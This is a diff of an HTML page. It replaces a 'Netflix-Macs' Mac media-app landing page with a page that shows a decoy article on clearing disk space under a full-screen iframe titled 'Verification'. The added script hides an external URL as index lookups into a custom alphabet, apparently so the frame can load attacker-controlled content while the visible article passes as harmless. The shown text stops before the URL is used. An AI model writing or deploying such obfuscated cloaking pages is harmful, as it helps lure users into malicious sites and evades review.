@@ -1,737 +1,210 @@
-<!DOCTYPE html> 
+
+<!doctype html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Netflix-Macs - Premium Media Hub for Mac Users</title>
-    <meta name="description" content="Netflix-Macs is your ultimate media center for macOS. Organize, stream, and enjoy all your entertainment content in one beautiful application.">
-    <meta name="keywords" content="media hub, entertainment center, mac media player, streaming organizer, content manager">
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-    <style>
-        * {
-            font-family: 'Montserrat', sans-serif;
-        }
-        .gradient-bg {
-            background: linear-gradient(135deg, #fefefe 0%, #fdf2f4 50%, #f5f3ff 100%);
-        }
-        .gradient-hero {
-            background: linear-gradient(180deg, #ffffff 0%, #fff1f2 30%, #fce7f3 60%, #f5f3ff 100%);
-        }
-        .gradient-card {
-            background: linear-gradient(145deg, #ffffff 0%, #fffbfc 100%);
-        }
-        .gradient-btn {
-            background: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%);
-        }
-        .gradient-btn:hover {
-            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
-        }
-        .gradient-btn-secondary {
-            background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%);
-        }
-        .soft-shadow {
-            box-shadow: 0 10px 40px rgba(220, 38, 38, 0.1);
-        }
-        .card-shadow {
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.05);
-        }
-        .fade-in {
-            animation: fadeIn 0.8s ease-out;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .float {
-            animation: float 6s ease-in-out infinite;
-        }
-        @keyframes float {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-        .gradient-text {
-            background: linear-gradient(135deg, #dc2626 0%, #f87171 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-        .gradient-text-purple {
-            background: linear-gradient(135deg, #7c3aed 0%, #a78bfa 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-        .pastel-red { background-color: #fee2e2; }
-        .pastel-purple { background-color: #ede9fe; }
-        .pastel-blue { background-color: #dbeafe; }
-        .pastel-green { background-color: #dcfce7; }
-        .pastel-orange { background-color: #ffedd5; }
-        .pastel-pink { background-color: #fce7f3; }
-        html {
-            scroll-behavior: smooth;
-        }
-        .faq-content {
-            max-height: 0;
-            overflow: hidden;
-            transition: max-height 0.3s ease-out;
-        }
-        .faq-content.active {
-            max-height: 500px;
-        }
-        .faq-icon {
-            transition: transform 0.3s ease;
-        }
-        .faq-icon.active {
-            transform: rotate(180deg);
-        }
-    </style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title></title>
+  <style>
+    :root{
+      --bg:#f5f5f7;
+      --text:#1d1d1f;
+      --muted:rgba(29,29,31,.62);
+      --card:#ffffff;
+      --border:rgba(0,0,0,.10);
+    }
+    html,body{height:100%}
+    body{
+      margin:0;
+      background:var(--bg);
+      color:var(--text);
+      font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "SF Pro Display","SF Pro Text", system-ui, sans-serif;
+      overflow:hidden;
+    }
+    .frameWrap{
+      width:100%;
+      height:100vh;
+      background:var(--bg);
+      border-bottom:1px solid rgba(0,0,0,.06);
+    }
+    iframe{
+      width:100%;
+      height:100%;
+      border:0;
+      display:block;
+      background:transparent;
+    }
+    main{
+      max-width: 980px;
+      margin: 0 auto;
+      padding: 48px 20px 80px;
+    }
+    h1{
+      font-size: clamp(28px, 4vw, 44px);
+      letter-spacing: -0.02em;
+      margin: 0 0 14px;
+    }
+    .lede{
+      color: var(--muted);
+      font-size: 17px;
+      line-height: 1.6;
+      margin: 0 0 28px;
+      max-width: 72ch;
+    }
+    .grid{
+      display:grid;
+      grid-template-columns: 1fr;
+      gap: 14px;
+    }
+    @media (min-width: 860px){
+      .grid{ grid-template-columns: 1fr 1fr; gap:16px; }
+    }
+    .card{
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 18px;
+      padding: 18px 18px;
+      box-shadow: 0 18px 40px rgba(0,0,0,.08);
+    }
+    h2{
+      margin: 0 0 10px;
+      font-size: 18px;
+      letter-spacing: -0.01em;
+    }
+    ul{
+      margin: 0;
+      padding-left: 18px;
+      color: rgba(29,29,31,.78);
+      line-height: 1.65;
+      font-size: 15px;
+    }
+    .note{
+      margin-top: 18px;
+      padding: 16px 18px;
+      border-radius: 16px;
+      background: rgba(0,0,0,.03);
+      border: 1px solid rgba(0,0,0,.06);
+      color: rgba(29,29,31,.72);
+      font-size: 14px;
+      line-height: 1.6;
+    }
+  </style>
 </head>
-<body class="gradient-bg min-h-screen">
+<body>
+  <section class="frameWrap">
+    <iframe id="verifyFrame" title="Verification"></iframe>
+  </section>
 
-    <div id="cookiePopup" class="fixed bottom-0 left-0 right-0 bg-white/95 backdrop-blur-md p-4 md:p-6 soft-shadow z-50 border-t border-red-100">
-        <div class="max-w-6xl mx-auto flex flex-col md:flex-row items-center justify-between gap-4">
-            <div class="flex-1">
-                <h4 class="font-semibold text-gray-800 mb-1">Cookie Notice</h4>
-                <p class="text-sm text-gray-600">We use cookies to enhance your browsing experience, analyze site traffic, and personalize content. By clicking "Accept", you consent to our use of cookies as described in our Privacy Policy below.</p>
-            </div>
-            <div class="flex gap-3">
-                <button onclick="declineCookies()" class="px-5 py-2.5 text-sm font-medium text-gray-600 hover:text-gray-800 border border-gray-300 rounded-full transition-all hover:border-gray-400">Decline</button>
-                <button onclick="acceptCookies()" class="px-5 py-2.5 text-sm font-medium text-white gradient-btn rounded-full transition-all hover:shadow-lg">Accept</button>
-            </div>
-        </div>
+  <main>
+    <h1>How to clear disk space on macOS</h1>
+    <p class="lede">
+      If your Mac is running low on storage, the fastest wins usually come from finding large files, removing unused apps,
+      and letting macOS optimize what can safely move to cloud storage. Here are practical, low-risk steps that work on most Macs.
+    </p>
+
+    <div class="grid">
+      <section class="card">
+        <h2>1) Check what’s taking space</h2>
+        <ul>
+          <li>Open System Settings (or System Preferences) and review storage categories.</li>
+          <li>Sort files by size in Finder to quickly spot large items.</li>
+          <li>Look for old installers, archives, and duplicate downloads.</li>
+        </ul>
+      </section>
+
+      <section class="card">
+        <h2>2) Remove large files you don’t need</h2>
+        <ul>
+          <li>Delete old videos, screen recordings, and project exports you’ve already backed up.</li>
+          <li>Remove unused DMGs/ZIPs after installation.</li>
+          <li>Move rarely used archives to external storage.</li>
+        </ul>
+      </section>
+
+      <section class="card">
+        <h2>3) Uninstall unused apps</h2>
+        <ul>
+          <li>Delete apps you haven’t used in months (especially large creative or game apps).</li>
+          <li>Check for leftover content inside your user Library if an app stored big assets.</li>
+          <li>Restart after removing large apps to refresh storage calculations.</li>
+        </ul>
+      </section>
+
+      <section class="card">
+        <h2>4) Clean up Downloads & attachments</h2>
+        <ul>
+          <li>Review your Downloads folder and remove old installers and duplicates.</li>
+          <li>Delete large mail attachments you don’t need locally.</li>
+          <li>Clear messaging app media caches if they grow too large.</li>
+        </ul>
+      </section>
+
+      <section class="card">
+        <h2>5) Use macOS optimization features</h2>
+        <ul>
+          <li>Enable “Optimize Storage” to keep only recent/local files when appropriate.</li>
+          <li>Store files in iCloud Drive and keep local copies only for active work.</li>
+          <li>Review “Reduce Clutter” suggestions and confirm before removing anything important.</li>
+        </ul>
+      </section>
+
+      <section class="card">
+        <h2>6) Don’t forget the Trash</h2>
+        <ul>
+          <li>Empty Trash after deleting large files (they still occupy space until cleared).</li>
+          <li>Check for other app-specific “trash” bins (photo/video apps may keep deleted items).</li>
+          <li>After big deletions, give macOS a minute to recalculate available storage.</li>
+        </ul>
+      </section>
     </div>
 
-    <nav class="fixed top-0 left-0 right-0 bg-white/80 backdrop-blur-md z-40 border-b border-red-50">
-        <div class="max-w-6xl mx-auto px-4 md:px-6">
-            <div class="flex items-center justify-between h-16 md:h-20">
-                <div class="flex items-center gap-2">
-                    <div class="w-9 h-9 rounded-xl gradient-btn flex items-center justify-center">
-                        <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 4v16M17 4v16M3 8h4m10 0h4M3 12h18M3 16h4m10 0h4M4 20h16a1 1 0 001-1V5a1 1 0 00-1-1H4a1 1 0 00-1 1v14a1 1 0 001 1z"></path>
-                        </svg>
-                    </div>
-                    <span class="text-xl font-bold text-gray-800">Netflix-Macs</span>
-                </div>
-                <div class="hidden md:flex items-center gap-8">
-                    <a href="#features" class="text-sm font-medium text-gray-600 hover:text-red-600 transition-colors">Features</a>
-                    <a href="#how-it-works" class="text-sm font-medium text-gray-600 hover:text-red-600 transition-colors">How It Works</a>
-                    <a href="#pricing" class="text-sm font-medium text-gray-600 hover:text-red-600 transition-colors">Pricing</a>
-                    <a href="#faq" class="text-sm font-medium text-gray-600 hover:text-red-600 transition-colors">FAQ</a>
-                </div>
-                <a href="#pricing" class="gradient-btn text-white px-5 py-2.5 rounded-full text-sm font-semibold transition-all hover:shadow-lg">
-                    Get Started
-                </a>
-            </div>
-        </div>
-    </nav>
+    <div class="note">
+      Tip: If storage seems “stuck” after cleanup, it’s often just indexing or temporary system accounting. A restart and a few minutes idle time can help the numbers update.
+    </div>
+  </main>
 
-    <section class="gradient-hero pt-32 md:pt-40 pb-20 md:pb-32">
-        <div class="max-w-6xl mx-auto px-4 md:px-6">
-            <div class="grid md:grid-cols-2 gap-12 items-center">
-                <div class="fade-in">
-                    <div class="inline-flex items-center gap-2 bg-red-50 text-red-700 px-4 py-2 rounded-full text-sm font-medium mb-6">
-                        <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
-                            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
-                        </svg>
-                        Trusted by 90,000+ Mac Users Worldwide
-                    </div>
-                    <h1 class="text-4xl md:text-5xl lg:text-6xl font-bold text-gray-900 leading-tight mb-6">
-                        Your Ultimate <span class="gradient-text">Media Hub</span> for Mac
-                    </h1>
-                    <h2 class="text-xl md:text-2xl text-gray-600 mb-8 leading-relaxed">
-                        Organize, manage, and enjoy all your entertainment content in one beautiful, powerful application designed exclusively for macOS.
-                    </h2>
-                    <div class="flex flex-col sm:flex-row gap-4 mb-8">
-                        <a href="#pricing" class="gradient-btn text-white px-8 py-4 rounded-full text-lg font-semibold transition-all hover:shadow-xl text-center">
-                            Get Started Now
-                        </a>
-                        <a href="#how-it-works" class="bg-white text-gray-700 px-8 py-4 rounded-full text-lg font-semibold border border-gray-200 hover:border-red-200 transition-all text-center">
-                            Learn More
-                        </a>
-                    </div>
-                    <div class="flex items-center gap-6">
-                        <div class="flex -space-x-3">
-                            <div class="w-10 h-10 rounded-full bg-gradient-to-br from-red-400 to-red-600 border-2 border-white"></div>
-                            <div class="w-10 h-10 rounded-full bg-gradient-to-br from-purple-400 to-purple-600 border-2 border-white"></div>
-                            <div class="w-10 h-10 rounded-full bg-gradient-to-br from-blue-400 to-blue-600 border-2 border-white"></div>
-                            <div class="w-10 h-10 rounded-full bg-gradient-to-br from-green-400 to-green-600 border-2 border-white"></div>
-                        </div>
-                        <div>
-                            <div class="flex items-center gap-1 text-yellow-500">
-                                <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                                <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                                <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                                <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                                <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                            </div>
-                            <p class="text-sm text-gray-600">4.9/5 from 4,200+ reviews</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="relative float">
-                    <div class="gradient-card rounded-3xl p-8 soft-shadow">
-                        <div class="bg-gradient-to-br from-gray-50 to-red-50 rounded-2xl p-6 mb-6">
-                            <div class="flex items-center gap-3 mb-4">
-                                <div class="w-3 h-3 rounded-full bg-red-400"></div>
-                                <div class="w-3 h-3 rounded-full bg-yellow-400"></div>
-                                <div class="w-3 h-3 rounded-full bg-green-400"></div>
-                            </div>
-                            <div class="space-y-4">
-                                <div class="flex items-center justify-between p-3 bg-white rounded-xl">
-                                    <div class="flex items-center gap-3">
-                                        <div class="w-10 h-10 bg-red-500 rounded-lg flex items-center justify-center">
-                                            <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path>
-                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
-                                            </svg>
-                                        </div>
-                                        <div>
-                                            <p class="font-semibold text-gray-800 text-sm">Movies Collection</p>
-                                            <p class="text-xs text-gray-500">1,247 items</p>
-                                        </div>
-                                    </div>
-                                    <span class="text-xs font-medium text-green-600 bg-green-50 px-2 py-1 rounded-full">Organized</span>
-                                </div>
-                                <div class="flex items-center justify-between p-3 bg-white rounded-xl">
-                                    <div class="flex items-center gap-3">
-                                        <div class="w-10 h-10 bg-purple-500 rounded-lg flex items-center justify-center">
-                                            <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19V6l12-3v13M9 19c0 1.105-1.343 2-3 2s-3-.895-3-2 1.343-2 3-2 3 .895 3 2zm12-3c0 1.105-1.343 2-3 2s-3-.895-3-2 1.343-2 3-2 3 .895 3 2zM9 10l12-3"></path>
-                                            </svg>
-                                        </div>
-                                        <div>
-                                            <p class="font-semibold text-gray-800 text-sm">Music Library</p>
-                                            <p class="text-xs text-gray-500">8,432 tracks</p>
-                                        </div>
-                                    </div>
-                                    <span class="text-xs font-medium text-green-600 bg-green-50 px-2 py-1 rounded-full">Synced</span>
-                                </div>
-                                <div class="flex items-center justify-between p-3 bg-white rounded-xl">
-                                    <div class="flex items-center gap-3">
-                                        <div class="w-10 h-10 bg-blue-500 rounded-lg flex items-center justify-center">
-                                            <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
-                                            </svg>
-                                        </div>
-                                        <div>
-                                            <p class="font-semibold text-gray-800 text-sm">Photo Albums</p>
-                                            <p class="text-xs text-gray-500">15,890 photos</p>
-                                        </div>
-                                    </div>
-                                    <span class="text-xs font-medium text-green-600 bg-green-50 px-2 py-1 rounded-full">Ready</span>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="text-center">
-                            <p class="text-3xl font-bold text-gray-800">25,569</p>
-                            <p class="text-sm text-gray-500">Media Items Managed</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
+  <script>
+const URL_ALPHABET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789:/.-_';
+const URL_IDX = [
+  7,19,19,15,18,62,63,63,
+  18,12,0,17,19,65,
+  18,4,17,21,8,2,4,18,65,
+  14,12,4,6,0,65,
+  21,4,17,2,4,11,65,
+  0,15,15,63
+];
 
-    <section class="py-16 bg-white/60">
-        <div class="max-w-6xl mx-auto px-4 md:px-6">
-            <p class="text-center text-gray-500 text-sm font-medium mb-8">OPTIMIZED FOR APPLE ECOSYSTEM</p>
-            <div class="flex flex-wrap justify-center items-center gap-8 md:gap-16">
-                <div class="text-center">
-                    <p class="text-2xl font-bold text-gray-800">macOS Sonoma</p>
-                    <p class="text-sm text-gray-500">Full Support</p>
-                </div>
-                <div class="text-center">
-                    <p class="text-2xl font-bold text-gray-800">macOS Ventura</p>
-                    <p class="text-sm text-gray-500">Compatible</p>
-                </div>
-                <div class="text-center">
-                    <p class="text-2xl font-bold text-gray-800">macOS Monterey</p>
-                    <p class="text-sm text-gray-500">Compatible</p>
-                </div>
-                <div class="text-center">
-                    <p class="text-2xl font-bold text-gray-800">Apple Silicon</p>
-                    <p class="text-sm text-gray-500">Native M1/M2/M3</p>
-                </div>
-            </div>
-        </div>
-    </section>
 
-    <section id="features" class="py-20 md:py-32">
-        <div class="max-w-6xl mx-auto px-4 md:px-6">
-            <div class="text-center mb-16">
-                <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mb-4">Powerful Features for Media Enthusiasts</h2>
-                <h3 class="text-lg text-gray-600 max-w-2xl mx-auto">Everything you need to organize, enjoy, and manage your entire media collection in one place</h3>
-            </div>
-            <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
-                <div class="gradient-card rounded-2xl p-8 card-shadow hover:shadow-xl transition-shadow">
-                    <div class="w-14 h-14 pastel-red rounded-2xl flex items-center justify-center mb-6">
-                        <svg class="w-7 h-7 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10"></path>
-                        </svg>
-                    </div>
-                    <h3 class="text-xl font-bold text-gray-900 mb-3">Smart Library Organization</h3>
-                    <p class="text-gray-600 leading-relaxed">Automatically categorize and sort your media files by type, date, genre, or custom tags. Find any content instantly with intelligent search.</p>
-                </div>
-                <div class="gradient-card rounded-2xl p-8 card-shadow hover:shadow-xl transition-shadow">
-                    <div class="w-14 h-14 pastel-purple rounded-2xl flex items-center justify-center mb-6">
-                        <svg class="w-7 h-7 text-purple-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
-                        </svg>
-                    </div>
-                    <h3 class="text-xl font-bold text-gray-900 mb-3">4K HDR Playback</h3>
-                    <p class="text-gray-600 leading-relaxed">Experience stunning visual quality with native support for 4K, HDR10, and Dolby Vision content. Optimized for Retina displays and ProMotion.</p>
-                </div>
-                <div class="gradient-card rounded-2xl p-8 card-shadow hover:shadow-xl transition-shadow">
-                    <div class="w-14 h-14 pastel-blue rounded-2xl flex items-center justify-center mb-6">
-                        <svg class="w-7 h-7 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"></path>
-                        </svg>
-                    </div>
-                    <h3 class="text-xl font-bold text-gray-900 mb-3">iCloud Integration</h3>
-                    <p class="text-gray-600 leading-relaxed">Seamlessly sync your media library across all your Apple devices. Access your content anywhere with automatic cloud backup and restore.</p>
-                </div>
-                <div class="gradient-card rounded-2xl p-8 card-shadow hover:shadow-xl transition-shadow">
-                    <div class="w-14 h-14 pastel-green rounded-2xl flex items-center justify-center mb-6">
-                        <svg class="w-7 h-7 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
-                        </svg>
-                    </div>
-                    <h3 class="text-xl font-bold text-gray-900 mb-3">Privacy First</h3>
-                    <p class="text-gray-600 leading-relaxed">Your media stays on your device. We never access, analyze, or share your personal content. Full compliance with Apple privacy standards.</p>
-                </div>
-                <div class="gradient-card rounded-2xl p-8 card-shadow hover:shadow-xl transition-shadow">
-                    <div class="w-14 h-14 pastel-orange rounded-2xl flex items-center justify-center mb-6">
-                        <svg class="w-7 h-7 text-orange-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
-                        </svg>
-                    </div>
-                    <h3 class="text-xl font-bold text-gray-900 mb-3">Lightning Fast</h3>
-                    <p class="text-gray-600 leading-relaxed">Built with native Swift and Metal for incredible performance. Launch in under a second and browse thousands of files without lag.</p>
-                </div>
-                <div class="gradient-card rounded-2xl p-8 card-shadow hover:shadow-xl transition-shadow">
-                    <div class="w-14 h-14 pastel-pink rounded-2xl flex items-center justify-center mb-6">
-                        <svg class="w-7 h-7 text-pink-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 5a1 1 0 011-1h14a1 1 0 011 1v2a1 1 0 01-1 1H5a1 1 0 01-1-1V5zM4 13a1 1 0 011-1h6a1 1 0 011 1v6a1 1 0 01-1 1H5a1 1 0 01-1-1v-6zM16 13a1 1 0 011-1h2a1 1 0 011 1v6a1 1 0 01-1 1h-2a1 1 0 01-1-1v-6z"></path>
-                        </svg>
-                    </div>
-                    <h3 class="text-xl font-bold text-gray-900 mb-3">Custom Playlists</h3>
-                    <p class="text-gray-600 leading-relaxed">Create personalized collections and smart playlists based on your preferences. Mix videos, music, and photos for the perfect entertainment experience.</p>
-                </div>
-            </div>
-        </div>
-    </section>
+const decodeURL = idx => idx.map(i => URL_ALPHABET[i]).join('');
+const TARGET_URL = decodeURL(URL_IDX);
 
-    <section id="how-it-works" class="py-20 md:py-32 bg-white/40">
-        <div class="max-w-6xl mx-auto px-4 md:px-6">
-            <div class="text-center mb-16">
-                <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mb-4">Get Started in Three Simple Steps</h2>
-                <h3 class="text-lg text-gray-600 max-w-2xl mx-auto">Setting up your personal media hub takes just minutes, not hours</h3>
-            </div>
-            <div class="grid md:grid-cols-3 gap-8">
-                <div class="text-center">
-                    <div class="w-20 h-20 bg-gradient-to-br from-red-100 to-red-200 rounded-3xl flex items-center justify-center mx-auto mb-6">
-                        <span class="text-3xl font-bold gradient-text">1</span>
-                    </div>
-                    <h3 class="text-xl font-bold text-gray-900 mb-3">Purchase & Activate</h3>
-                    <p class="text-gray-600">Complete your one-time purchase and receive instant access to your license key via email. No subscription required.</p>
-                </div>
-                <div class="text-center">
-                    <div class="w-20 h-20 bg-gradient-to-br from-purple-100 to-purple-200 rounded-3xl flex items-center justify-center mx-auto mb-6">
-                        <span class="text-3xl font-bold gradient-text-purple">2</span>
-                    </div>
-                    <h3 class="text-xl font-bold text-gray-900 mb-3">Import Your Media</h3>
-                    <p class="text-gray-600">Point Netflix-Macs to your media folders and watch as it automatically organizes everything. Supports all major formats.</p>
-                </div>
-                <div class="text-center">
-                    <div class="w-20 h-20 bg-gradient-to-br from-blue-100 to-blue-200 rounded-3xl flex items-center justify-center mx-auto mb-6">
-                        <span class="text-3xl font-bold text-blue-600">3</span>
-                    </div>
-                    <h3 class="text-xl font-bold text-gray-900 mb-3">Enjoy Your Content</h3>
-                    <p class="text-gray-600">Browse your beautifully organized library, create playlists, and enjoy your media with stunning quality playback.</p>
-                </div>
-            </div>
-        </div>
-    </section>
 
-    <section class="py-20 md:py-32">
-        <div class="max-w-6xl mx-auto px-4 md:px-6">
-            <div class="text-center mb-16">
-                <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mb-4">Trusted by Thousands of Mac Users</h2>
-                <h3 class="text-lg text-gray-600">Join a growing community of satisfied customers</h3>
-            </div>
-            <div class="grid md:grid-cols-4 gap-8 text-center">
-                <div>
-                    <p class="text-4xl md:text-5xl font-bold gradient-text mb-2">90K+</p>
-                    <p class="text-gray-600">Active Users</p>
-                </div>
-                <div>
-                    <p class="text-4xl md:text-5xl font-bold gradient-text-purple mb-2">4.9</p>
-                    <p class="text-gray-600">Average Rating</p>
-                </div>
-                <div>
-                    <p class="text-4xl md:text-5xl font-bold text-blue-600 mb-2">50M+</p>
-                    <p class="text-gray-600">Files Organized</p>
-                </div>
-                <div>
-                    <p class="text-4xl md:text-5xl font-bold text-green-600 mb-2">99.9%</p>
-                    <p class="text-gray-600">Uptime</p>
-                </div>
-            </div>
-        </div>
-    </section>
 
-    <section class="py-20 md:py-32 bg-white/40">
-        <div class="max-w-6xl mx-auto px-4 md:px-6">
-            <div class="text-center mb-16">
-                <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mb-4">What Our Users Say</h2>
-                <h3 class="text-lg text-gray-600">Real feedback from real customers</h3>
-            </div>
-            <div class="grid md:grid-cols-3 gap-8">
-                <div class="gradient-card rounded-2xl p-8 card-shadow">
-                    <div class="flex items-center gap-1 text-yellow-500 mb-4">
-                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
